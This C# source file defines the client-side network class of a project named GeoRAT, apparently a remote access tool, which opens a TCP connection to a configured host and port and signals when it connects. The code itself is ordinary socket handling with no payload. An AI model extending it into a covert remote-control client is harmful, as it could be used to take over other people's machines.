﻿using System;
using System.Net.Sockets;


namespace GeoRAT.Client.Network
{
    internal class ClientNetwork
    {
        #region Declarations
        public string Ip { get; private set; }
        public int Port { get; private set; }
        private readonly Socket _clientSocket;

        //delegates and events 
        public delegate void Connected(Socket s);

        public event Connected OnConnected;
        ////
        #endregion

        #region Constructor

        internal ClientNetwork(string ip, int port)
        {
            Ip = ip;
            Port = port;
           _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        }

        #endregion

        #region Start

        internal void BeginConnect()
        {

            _clientSocket.BeginConnect(Ip, Port, ConnectedCallback, null);

        }

        private void ConnectedCallback(IAsyncResult result)
        {
            try
            {
                _clientSocket.EndConnect(result);
                OnConnected?.Invoke(_clientSocket);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);

            }
            #endregion
        }
    }
}

